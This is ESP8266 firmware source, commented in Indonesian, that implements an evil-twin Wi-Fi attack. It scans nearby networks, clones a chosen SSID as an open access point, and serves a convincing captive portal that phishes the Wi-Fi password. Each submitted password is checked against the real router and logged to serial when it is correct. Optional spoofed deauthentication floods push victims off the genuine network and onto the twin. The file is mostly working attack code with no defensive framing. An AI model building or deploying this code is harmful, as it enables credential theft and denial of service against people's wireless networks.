#include "evil.h"
#include "sniffer.h"
#include "cli.h"
#include "beacon.h"
#include "deauth.h"
#include "pdeauth.h"
#include "settings.h"
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <string.h>

extern "C" {
  #include "user_interface.h"
  int wifi_send_pkt_freedom(uint8_t* buf, int len, bool sys_seq);
}

#define EV_MAX_AP 24

struct scan_entry { uint8_t bssid[6]; uint8_t channel; int8_t rssi; char ssid[33]; };
static scan_entry s_scan[EV_MAX_AP];
static uint8_t    s_scanN = 0;

static ESP8266WebServer s_web(80);
static DNSServer        s_dns;

enum { EV_OFF, EV_PORTAL, EV_VERIFYING };
static uint8_t  s_state = EV_OFF;
enum { V_NONE, V_WRONG, V_OK };
static uint8_t  s_verdict = V_NONE;

static char     s_ssid[33] = {0};
static uint8_t  s_bssid[6];
static uint8_t  s_ch = 1;
static char     s_pwd[65] = {0};
static uint32_t s_verifyStart = 0;
static uint32_t s_lastStat = 0;
static bool     s_handlersSet = false;

// auto-deauth AP asli (completion attack chain) — default OFF
static bool     s_autoDeauth = false;
static uint32_t s_lastDeauth = 0;
static uint32_t s_deauthSent = 0;
static uint8_t  s_dpkt[26];
static uint32_t s_okTime     = 0;   // waktu password benar (utk auto-teardown)

// Kirim broadcast deauth yang seolah dari AP asli (s_bssid) supaya
// korban tertendang dari AP asli & pindah ke twin kita. Twin pakai
// BSSID beda 1 byte -> client twin TIDAK ikut tertendang.
static void send_auto_deauth() {
  static const uint8_t bcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
  int i = 0;
  s_dpkt[i++] = 0xC0; s_dpkt[i++] = 0x00; s_dpkt[i++] = 0x00; s_dpkt[i++] = 0x00; // deauth
  for (int j = 0; j < 6; j++) s_dpkt[i++] = bcast[j];     // addr1 = broadcast
  for (int j = 0; j < 6; j++) s_dpkt[i++] = s_bssid[j];   // addr2 = AP asli (spoof)
  for (int j = 0; j < 6; j++) s_dpkt[i++] = s_bssid[j];   // addr3 = AP asli
  s_dpkt[i++] = 0x00; s_dpkt[i++] = 0x00;                 // seq
  s_dpkt[i++] = 0x01; s_dpkt[i++] = 0x00;                 // reason 1
  for (int k = 0; k < 4; k++) { if (wifi_send_pkt_freedom(s_dpkt, i, 0) == 0) s_deauthSent++; delay(1); }
}

// ----------------------------------------------------------- halaman -------
// Gaya captive-portal "Sign in to Wi-Fi" — terang, bersih, meyakinkan.
static String pagePortal(bool err) {
  String h = F("<!DOCTYPE html><html><head><meta charset=utf-8>"
               "<meta name=viewport content='width=device-width,initial-scale=1'>"
               "<title>Masuk ke Wi-Fi</title><style>"
               "*{box-sizing:border-box;margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}"
               "body{background:linear-gradient(160deg,#eef2f7,#dde5ef);min-height:100vh;display:flex;"
               "align-items:center;justify-content:center;padding:16px}"
               ".card{background:#fff;width:100%;max-width:360px;border-radius:18px;"
               "box-shadow:0 14px 44px rgba(20,40,80,.20);overflow:hidden}"
               ".top{background:linear-gradient(135deg,#1a73e8,#1457c0);padding:26px 22px 20px;color:#fff;text-align:center}"
               ".ic{width:48px;height:48px;border-radius:50%;background:rgba(255,255,255,.18);margin:0 auto 10px;"
               "display:flex;align-items:center;justify-content:center;font-size:24px}"
               ".top h1{font-size:14px;font-weight:500;opacity:.92}"
               ".ssid{font-size:20px;font-weight:700;margin-top:3px}"
               ".bd{padding:22px}.bd p{color:#5f6b7a;font-size:13.5px;line-height:1.55;margin-bottom:15px}"
               "label{font-size:12px;color:#8a95a3;font-weight:600}"
               "input{width:100%;padding:13px;margin-top:6px;border:1.5px solid #d7dee7;border-radius:10px;font-size:15px;outline:none}"
               "input:focus{border-color:#1a73e8}"
               "button{width:100%;margin-top:16px;padding:13px;background:#1a73e8;color:#fff;border:0;"
               "border-radius:10px;font-size:15px;font-weight:600}"
               ".er{background:#fdecea;color:#c5221f;font-size:12.5px;padding:9px 11px;border-radius:9px;margin-bottom:13px}"
               ".ft{text-align:center;color:#9aa4b1;font-size:11px;padding:0 22px 18px}"
               "</style></head><body><div class=card>"
               "<div class=top><div class=ic>&#128246;</div><h1>Sambungkan ke jaringan</h1><div class=ssid>");
  h += s_ssid;
  h += F("</div></div><div class=bd>"
         "<p>Untuk melanjutkan akses internet, masukkan kata sandi Wi-Fi jaringan ini.</p>");
  if (err) h += F("<div class=er>Kata sandi salah. Silakan coba lagi.</div>");
  h += F("<form method=POST action=/connect>"
         "<label>Kata sandi Wi-Fi</label>"
         "<input type=password name=pwd placeholder='Masukkan kata sandi' required autofocus>"
         "<button>Sambungkan</button></form></div>"
         "<div class=ft>&#128274; Koneksi terenkripsi &middot; WPA2</div>"
         "</div></body></html>");
  return h;
}

static String pageChecking() {
  return F("<!DOCTYPE html><html><head><meta charset=utf-8>"
           "<meta name=viewport content='width=device-width,initial-scale=1'>"
           "<meta http-equiv=refresh content='3;url=/result'><title>Menyambungkan</title><style>"
           "*{margin:0;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}"
           "body{background:linear-gradient(160deg,#eef2f7,#dde5ef);min-height:100vh;display:flex;"
           "flex-direction:column;align-items:center;justify-content:center;color:#3a4654}"
           ".sp{width:42px;height:42px;border:4px solid #cfd8e3;border-top-color:#1a73e8;border-radius:50%;"
           "animation:s .9s linear infinite;margin-bottom:18px}@keyframes s{to{transform:rotate(360deg)}}"
           "p{font-size:14px}</style></head><body>"
           "<div class=sp></div><p>Menyambungkan ke jaringan...</p></body></html>");
}

static String pageSuccess() {
  return F("<!DOCTYPE html><html><head><meta charset=utf-8>"
           "<meta name=viewport content='width=device-width,initial-scale=1'><title>Menyambungkan</title><style>"
           "*{margin:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}"
           "body{background:linear-gradient(160deg,#eef2f7,#dde5ef);min-height:100vh;display:flex;"
           "flex-direction:column;align-items:center;justify-content:center;color:#3a4654;text-align:center;padding:24px}"
           ".ck{width:60px;height:60px;border-radius:50%;background:#1e9e54;color:#fff;font-size:32px;"
           "display:flex;align-items:center;justify-content:center;margin-bottom:16px}"
           "h3{font-size:17px;margin-bottom:6px}p{font-size:13.5px;color:#5f6b7a;line-height:1.5;margin-bottom:18px}"
           ".bar{width:210px;height:6px;background:#d7dee7;border-radius:4px;overflow:hidden}"
           ".bar>i{display:block;height:100%;width:0;background:#1a73e8;border-radius:4px;animation:f 8s linear forwards}"
           "@keyframes f{to{width:100%}}.sm{margin-top:13px;font-size:11px;color:#9aa4b1}</style></head><body>"
           "<div class=ck>&#10003;</div><h3>Kata sandi terverifikasi</h3>"
           "<p>Menyelesaikan koneksi ke internet...<br>Mohon tunggu sebentar.</p>"
           "<div class=bar><i></i></div><div class=sm>Jangan tutup halaman ini</div></body></html>");
}

// ----------------------------------------------------------- handlers ------
static void handleRoot()  { s_web.send(200, "text/html", pagePortal(s_verdict == V_WRONG)); }

static void handleConnect() {
  String pwd = s_web.arg("pwd");
  strncpy(s_pwd, pwd.c_str(), 64); s_pwd[64] = 0;
  IPAddress ip = s_web.client().remoteIP();
  Serial.printf("\n[evil] >>> PASSWORD DICOBA: \"%s\"  (dari %s)\n", s_pwd, ip.toString().c_str());

  // balas dulu, baru nyalakan STA untuk verifikasi (non-blocking)
  s_web.send(200, "text/html", pageChecking());
  WiFi.mode(WIFI_AP_STA);                 // sementara: AP tetap + STA untuk cek
  WiFi.begin(s_ssid, s_pwd);
  s_state   = EV_VERIFYING;
  s_verdict = V_NONE;
  s_verifyStart = millis();
}

static void handleResult() {
  if (s_state == EV_VERIFYING)      s_web.send(200, "text/html", pageChecking());
  else if (s_verdict == V_OK)       s_web.send(200, "text/html", pageSuccess());
  else                              s_web.send(200, "text/html", pagePortal(s_verdict == V_WRONG));
}

// ----------------------------------------------------------- lifecycle -----
void evil_stop() {
  if (s_state == EV_OFF) return;
  s_web.stop();
  s_dns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  WiFi.mode(WIFI_STA);
  s_state = EV_OFF;
  Serial.println(F("[evil] STOP — evil twin dimatikan"));
}

static void evil_start(int idx) {
  evil_attack(s_scan[idx].bssid, s_scan[idx].channel, s_scan[idx].ssid);
}

void evil_attack(const uint8_t* bssid, uint8_t ch, const char* ssid) {
  memcpy(s_bssid, bssid, 6);
  s_ch = ch;
  strncpy(s_ssid, ssid, sizeof(s_ssid)); s_ssid[sizeof(s_ssid) - 1] = 0;
  s_pwd[0] = 0; s_verdict = V_NONE;
  s_autoDeauth = settings_get()->evil_autodeauth;   // default dari settings
  s_lastDeauth = 0; s_deauthSent = 0; s_okTime = 0;

  // bersihkan mode lain
  if (sniffer_running()) sniffer_stop();
  beacon_stop(); deauth_stop(); pdeauth_stop();

  // Portal jalan di mode AP MURNI -> stabil (STA tidak scan/wandering yang
  // mengganggu DHCP). STA hanya dinyalakan sebentar saat verifikasi password.
  // Pakai MAC default ESP (bukan clone) -> asosiasi paling andal; BSSID tetap
  // beda dari AP asli sehingga auto-deauth tak menendang client twin sendiri.
  WiFi.persistent(false);
  WiFi.mode(WIFI_AP);
  bool ok = WiFi.softAP(s_ssid, (const char*)NULL, s_ch);   // open, channel = AP asli
  delay(100);

  IPAddress apip = WiFi.softAPIP();
  s_dns.setErrorReplyCode(DNSReplyCode::NoError);
  s_dns.start(53, "*", apip);                    // catch-all -> captive portal

  if (!s_handlersSet) {
    s_web.on("/", handleRoot);
    s_web.on("/connect", HTTP_POST, handleConnect);
    s_web.on("/result", handleResult);
    s_web.onNotFound(handleRoot);                // trigger popup captive portal
    s_handlersSet = true;
  }
  s_web.begin();

  s_state = EV_PORTAL;
  s_lastStat = millis();
  Serial.printf("[evil] AKTIF — twin '%s' ch%d, BSSID %s%s\n",
                s_ssid, s_ch, nc_mac_str(s_bssid), ok ? "" : " (softAP gagal?)");
  Serial.printf("       portal di http://%s/  — tunggu korban masuk. 'evil stop' utk berhenti\n",
                apip.toString().c_str());
}

bool        evil_active()       { return s_state != EV_OFF; }
int         evil_clients()      { return (s_state != EV_OFF) ? WiFi.softAPgetStationNum() : 0; }
bool        evil_got_password() { return s_verdict == V_OK; }
const char* evil_password()     { return s_pwd; }
const char* evil_ssid()         { return s_ssid; }

void evil_loop() {
  if (s_state == EV_OFF) return;
  s_dns.processNextRequest();
  s_web.handleClient();

  if (s_state == EV_VERIFYING) {
    if (WiFi.status() == WL_CONNECTED) {
      s_verdict = V_OK; s_state = EV_PORTAL;
      Serial.printf("\n[evil] ====================================\n");
      Serial.printf("[evil]  PASSWORD BENAR: \"%s\"\n", s_pwd);
      Serial.printf("[evil]  SSID: %s\n", s_ssid);
      Serial.printf("[evil] ====================================\n");
      WiFi.disconnect(false);
      WiFi.mode(WIFI_AP);                        // kembali ke AP murni (stabil)
      s_autoDeauth = false;                      // stop deauth -> korban bisa balik ke AP asli
      s_okTime = millis();                       // mulai hitung mundur auto-teardown
    } else if (millis() - s_verifyStart > 10000) {
      s_verdict = V_WRONG; s_state = EV_PORTAL;
      Serial.printf("[evil] password SALAH: \"%s\" — portal minta ulang\n", s_pwd);
      WiFi.disconnect(false);
      WiFi.mode(WIFI_AP);                        // kembali ke AP murni
    }
  }

  // Update A: password sudah benar -> beri jeda ~6s (biar halaman "berhasil"
  // sempat tampil), lalu bongkar twin. Deauth sudah dimatikan, jadi HP korban
  // otomatis reconnect ke AP asli pakai password tersimpannya (Update B).
  if (s_verdict == V_OK && s_okTime && (millis() - s_okTime) >= 9000) {
    Serial.println(F("[evil] selesai — twin dibongkar, korban kembali ke AP asli"));
    evil_stop();
    return;
  }

  // auto-deauth AP asli (hanya saat portal aktif; di-pause saat verifikasi
  // supaya STA verifikasi kita sendiri tidak ikut tertendang)
  if (s_autoDeauth && s_state == EV_PORTAL && (millis() - s_lastDeauth) >= 500) {
    s_lastDeauth = millis();
    send_auto_deauth();
  }

  if (millis() - s_lastStat >= 5000) {
    s_lastStat = millis();
    Serial.printf("[evil] '%s' ch%d | client: %d | auto-deauth: %s (%lu)%s\n",
      s_ssid, s_ch, WiFi.softAPgetStationNum(), s_autoDeauth ? "ON" : "OFF",
      (unsigned long)s_deauthSent, s_verdict == V_OK ? " | PASSWORD TERTANGKAP" : "");
  }
}

uint32_t evil_deauth_count() { return s_deauthSent; }
bool     evil_deauth_on()    { return s_autoDeauth; }
void     evil_toggle_deauth(){ s_autoDeauth = !s_autoDeauth; if (s_autoDeauth) s_lastDeauth = 0; }

// -------------------------------------------------- pilih AP (capture) -----
static void on_select(const char* line) {
  if (line[0] == 'q' || line[0] == 'Q' || line[0] == '\0') {
    Serial.println(F("[evil] dibatalkan")); cli_release(); return;
  }
  int idx = atoi(line);
  if (idx < 0 || idx >= (int)s_scanN) {
    Serial.printf("nomor tidak valid (0-%u). coba lagi atau 'q'\n", s_scanN ? s_scanN - 1 : 0);
    return;
  }
  evil_start(idx);
  cli_release();
}

static void cmd_evil(int argc, char** argv) {
  if (argc >= 2 && strcasecmp(argv[1], "stop") == 0) { evil_stop(); return; }

  beacon_stop(); deauth_stop(); pdeauth_stop();
  if (sniffer_running()) sniffer_stop();
  Serial.println(F("[evil] memindai AP..."));
  int n = WiFi.scanNetworks(false, true);
  s_scanN = 0;
  for (int i = 0; i < n && s_scanN < EV_MAX_AP; i++) {
    memcpy(s_scan[s_scanN].bssid, WiFi.BSSID(i), 6);
    s_scan[s_scanN].channel = (uint8_t)WiFi.channel(i);
    s_scan[s_scanN].rssi    = (int8_t)WiFi.RSSI(i);
    strncpy(s_scan[s_scanN].ssid, WiFi.SSID(i).c_str(), 32);
    s_scan[s_scanN].ssid[32] = 0;
    s_scanN++;
  }
  WiFi.scanDelete();
  if (s_scanN == 0) { Serial.println(F("[evil] tidak ada AP")); return; }

  Serial.println(F("=== pilih AP untuk EVIL TWIN ==="));
  for (uint8_t i = 0; i < s_scanN; i++)
    Serial.printf("  %u) ch%-2d %4ddBm  %s  %s\n",
      i, s_scan[i].channel, s_scan[i].rssi, nc_mac_str(s_scan[i].bssid),
      s_scan[i].ssid[0] ? s_scan[i].ssid : "<hidden>");
  Serial.println(F("ketik nomor AP (atau 'q' batal):"));
  cli_capture(on_select, "evil AP#> ");
}

void evil_init() {
  cli_register("evil", "evil twin + captive portal (evil | evil stop)", cmd_evil);
}
